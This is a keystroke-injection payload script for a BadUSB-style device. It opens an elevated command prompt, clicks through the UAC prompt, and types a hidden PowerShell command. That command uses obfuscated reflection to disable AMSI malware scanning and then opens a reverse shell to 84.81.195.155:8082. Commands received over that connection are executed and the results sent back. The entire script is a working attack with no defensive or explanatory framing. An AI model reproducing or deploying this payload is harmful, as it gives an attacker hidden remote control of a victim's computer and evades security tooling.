layout('us');			// US keyboard layout
typingSpeed(1,0)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

delay(500)
press("GUI r");
delay(500);
type("cmd")
press("CTRL SHIFT ENTER")
delay(1000)				// wait a little
press("SHIFT TAB")		// select Yes
press("ENTER")			// validate
delay(1000);
type("powershell -WindowStyle Hidden -nop -c \"sET-ItEM ( 'V'+' aR' + ' IA' + 'blE:1q2' + ' uZx' ) ( [TYpE]( \\\"{1}{0}\\\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \\\"1Q2U\\\" +\\\"zX\\\" ) -VaL ).\\\" A`ss` Embly\\\".\\\"GET`TY`Pe\\\"(( \\\"{6}{3}{1}{4}{2}{0}{5}\\\" -f' Util',' A',' Amsi','.Management.',' utomation.','s','System' ) ).\\\"g` etf` iElD\\\"( ( \\\"{0}{2}{1}\\\" -f' amsi','d',' InitFaile' ),( \\\"{2}{4}{0}{1}{3}\\\" -f 'Stat',' i','NonPubli',' c',' c,' )).\\\"sE`T`VaLUE\\\"( ${n` ULl},${t`RuE} );$client = New-Object System.Net.Sockets.TCPClient('84.81.195.155',8082);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")
type("\n")